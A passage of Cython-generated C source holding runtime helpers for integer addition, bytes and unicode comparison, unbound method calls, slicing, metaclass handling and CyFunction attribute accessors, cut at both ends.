                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif

/* BytesEquals */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}

/* UnicodeEquals */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}

/* UnpackUnboundCMethod */
static int __Pyx_TryUnpackUnboundCMethod(__Pyx_CachedCFunction* target) {
    PyObject *method;
    method = __Pyx_PyObject_GetAttrStr(target->type, *target->method_name);
    if (unlikely(!method))
        return -1;
    target->method = method;
#if CYTHON_COMPILING_IN_CPYTHON
    #if PY_MAJOR_VERSION >= 3
    if (likely(__Pyx_TypeCheck(method, &PyMethodDescr_Type)))
    #endif
    {
        PyMethodDescrObject *descr = (PyMethodDescrObject*) method;
        target->func = descr->d_method->ml_meth;
        target->flag = descr->d_method->ml_flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_STACKLESS);
    }
#endif
    return 0;
}

/* CallUnboundCMethod0 */
static PyObject* __Pyx__CallUnboundCMethod0(__Pyx_CachedCFunction* cfunc, PyObject* self) {
    PyObject *args, *result = NULL;
    if (unlikely(!cfunc->method) && unlikely(__Pyx_TryUnpackUnboundCMethod(cfunc) < 0)) return NULL;
#if CYTHON_ASSUME_SAFE_MACROS
    args = PyTuple_New(1);
    if (unlikely(!args)) goto bad;
    Py_INCREF(self);
    PyTuple_SET_ITEM(args, 0, self);
#else
    args = PyTuple_Pack(1, self);
    if (unlikely(!args)) goto bad;
#endif
    result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
    Py_DECREF(args);
bad:
    return result;
}

/* py_dict_keys */
static CYTHON_INLINE PyObject* __Pyx_PyDict_Keys(PyObject* d) {
    if (PY_MAJOR_VERSION >= 3)
        return __Pyx_CallUnboundCMethod0(&__pyx_umethod_PyDict_Type_keys, d);
    else
        return PyDict_Keys(d);
}

/* CallUnboundCMethod1 */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg) {
    if (likely(cfunc->func)) {
        int flag = cfunc->flag;
        if (flag == METH_O) {
            return (*(cfunc->func))(self, arg);
        } else if (PY_VERSION_HEX >= 0x030600B1 && flag == METH_FASTCALL) {
            #if PY_VERSION_HEX >= 0x030700A0
                return (*(__Pyx_PyCFunctionFast)(void*)(PyCFunction)cfunc->func)(self, &arg, 1);
            #else
                return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, &arg, 1, NULL);
            #endif
        } else if (PY_VERSION_HEX >= 0x030700A0 && flag == (METH_FASTCALL | METH_KEYWORDS)) {
            return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, &arg, 1, NULL);
        }
    }
    return __Pyx__CallUnboundCMethod1(cfunc, self, arg);
}
#endif
static PyObject* __Pyx__CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg){
    PyObject *args, *result = NULL;
    if (unlikely(!cfunc->func && !cfunc->method) && unlikely(__Pyx_TryUnpackUnboundCMethod(cfunc) < 0)) return NULL;
#if CYTHON_COMPILING_IN_CPYTHON
    if (cfunc->func && (cfunc->flag & METH_VARARGS)) {
        args = PyTuple_New(1);
        if (unlikely(!args)) goto bad;
        Py_INCREF(arg);
        PyTuple_SET_ITEM(args, 0, arg);
        if (cfunc->flag & METH_KEYWORDS)
            result = (*(PyCFunctionWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, NULL);
        else
            result = (*cfunc->func)(self, args);
    } else {
        args = PyTuple_New(2);
        if (unlikely(!args)) goto bad;
        Py_INCREF(self);
        PyTuple_SET_ITEM(args, 0, self);
        Py_INCREF(arg);
        PyTuple_SET_ITEM(args, 1, arg);
        result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
    }
#else
    args = PyTuple_Pack(2, self, arg);
    if (unlikely(!args)) goto bad;
    result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
#endif
bad:
    Py_XDECREF(args);
    return result;
}

/* CallUnboundCMethod2 */
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030600B1
static CYTHON_INLINE PyObject *__Pyx_CallUnboundCMethod2(__Pyx_CachedCFunction *cfunc, PyObject *self, PyObject *arg1, PyObject *arg2) {
    if (likely(cfunc->func)) {
        PyObject *args[2] = {arg1, arg2};
        if (cfunc->flag == METH_FASTCALL) {
            #if PY_VERSION_HEX >= 0x030700A0
            return (*(__Pyx_PyCFunctionFast)(void*)(PyCFunction)cfunc->func)(self, args, 2);
            #else
            return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, 2, NULL);
            #endif
        }
        #if PY_VERSION_HEX >= 0x030700A0
        if (cfunc->flag == (METH_FASTCALL | METH_KEYWORDS))
            return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, 2, NULL);
        #endif
    }
    return __Pyx__CallUnboundCMethod2(cfunc, self, arg1, arg2);
}
#endif
static PyObject* __Pyx__CallUnboundCMethod2(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg1, PyObject* arg2){
    PyObject *args, *result = NULL;
    if (unlikely(!cfunc->func && !cfunc->method) && unlikely(__Pyx_TryUnpackUnboundCMethod(cfunc) < 0)) return NULL;
#if CYTHON_COMPILING_IN_CPYTHON
    if (cfunc->func && (cfunc->flag & METH_VARARGS)) {
        args = PyTuple_New(2);
        if (unlikely(!args)) goto bad;
        Py_INCREF(arg1);
        PyTuple_SET_ITEM(args, 0, arg1);
        Py_INCREF(arg2);
        PyTuple_SET_ITEM(args, 1, arg2);
        if (cfunc->flag & METH_KEYWORDS)
            result = (*(PyCFunctionWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, NULL);
        else
            result = (*cfunc->func)(self, args);
    } else {
        args = PyTuple_New(3);
        if (unlikely(!args)) goto bad;
        Py_INCREF(self);
        PyTuple_SET_ITEM(args, 0, self);
        Py_INCREF(arg1);
        PyTuple_SET_ITEM(args, 1, arg1);
        Py_INCREF(arg2);
        PyTuple_SET_ITEM(args, 2, arg2);
        result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
    }
#else
    args = PyTuple_Pack(3, self, arg1, arg2);
    if (unlikely(!args)) goto bad;
    result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
#endif
bad:
    Py_XDECREF(args);
    return result;
}

/* dict_getitem_default */
static PyObject* __Pyx_PyDict_GetItemDefault(PyObject* d, PyObject* key, PyObject* default_value) {
    PyObject* value;
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (unlikely(PyErr_Occurred()))
            return NULL;
        value = default_value;
    }
    Py_INCREF(value);
    if ((1));
#else
    if (PyString_CheckExact(key) || PyUnicode_CheckExact(key) || PyInt_CheckExact(key)) {
        value = PyDict_GetItem(d, key);
        if (unlikely(!value)) {
            value = default_value;
        }
        Py_INCREF(value);
    }
#endif
    else {
        if (default_value == Py_None)
            value = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_get, d, key);
        else
            value = __Pyx_CallUnboundCMethod2(&__pyx_umethod_PyDict_Type_get, d, key, default_value);
    }
    return value;
}

/* SliceObject */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#endif
    {
        PyObject* result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object is unsliceable", Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}

/* CalculateMetaclass */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases) {
    Py_ssize_t i, nbases = PyTuple_GET_SIZE(bases);
    for (i=0; i < nbases; i++) {
        PyTypeObject *tmptype;
        PyObject *tmp = PyTuple_GET_ITEM(bases, i);
        tmptype = Py_TYPE(tmp);
#if PY_MAJOR_VERSION < 3
        if (tmptype == &PyClass_Type)
            continue;
#endif
        if (!metaclass) {
            metaclass = tmptype;
            continue;
        }
        if (PyType_IsSubtype(metaclass, tmptype))
            continue;
        if (PyType_IsSubtype(tmptype, metaclass)) {
            metaclass = tmptype;
            continue;
        }
        PyErr_SetString(PyExc_TypeError,
                        "metaclass conflict: "
                        "the metaclass of a derived class "
                        "must be a (non-strict) subclass "
                        "of the metaclasses of all its bases");
        return NULL;
    }
    if (!metaclass) {
#if PY_MAJOR_VERSION < 3
        metaclass = &PyClass_Type;
#else
        metaclass = &PyType_Type;
#endif
    }
    Py_INCREF((PyObject*) metaclass);
    return (PyObject*) metaclass;
}

/* Py3ClassCreate */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name,
                                           PyObject *qualname, PyObject *mkw, PyObject *modname, PyObject *doc) {
    PyObject *ns;
    if (metaclass) {
        PyObject *prep = __Pyx_PyObject_GetAttrStr(metaclass, __pyx_n_s_prepare);
        if (prep) {
            PyObject *pargs = PyTuple_Pack(2, name, bases);
            if (unlikely(!pargs)) {
                Py_DECREF(prep);
                return NULL;
            }
            ns = PyObject_Call(prep, pargs, mkw);
            Py_DECREF(prep);
            Py_DECREF(pargs);
        } else {
            if (unlikely(!PyErr_ExceptionMatches(PyExc_AttributeError)))
                return NULL;
            PyErr_Clear();
            ns = PyDict_New();
        }
    } else {
        ns = PyDict_New();
    }
    if (unlikely(!ns))
        return NULL;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_module, modname) < 0)) goto bad;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_qualname, qualname) < 0)) goto bad;
    if (unlikely(doc && PyObject_SetItem(ns, __pyx_n_s_doc, doc) < 0)) goto bad;
    return ns;
bad:
    Py_DECREF(ns);
    return NULL;
}
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases,
                                      PyObject *dict, PyObject *mkw,
                                      int calculate_metaclass, int allow_py2_metaclass) {
    PyObject *result, *margs;
    PyObject *owned_metaclass = NULL;
    if (allow_py2_metaclass) {
        owned_metaclass = PyObject_GetItem(dict, __pyx_n_s_metaclass);
        if (owned_metaclass) {
            metaclass = owned_metaclass;
        } else if (likely(PyErr_ExceptionMatches(PyExc_KeyError))) {
            PyErr_Clear();
        } else {
            return NULL;
        }
    }
    if (calculate_metaclass && (!metaclass || PyType_Check(metaclass))) {
        metaclass = __Pyx_CalculateMetaclass((PyTypeObject*) metaclass, bases);
        Py_XDECREF(owned_metaclass);
        if (unlikely(!metaclass))
            return NULL;
        owned_metaclass = metaclass;
    }
    margs = PyTuple_Pack(3, name, bases, dict);
    if (unlikely(!margs)) {
        result = NULL;
    } else {
        result = PyObject_Call(metaclass, margs, mkw);
        Py_DECREF(margs);
    }
    Py_XDECREF(owned_metaclass);
    return result;
}

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
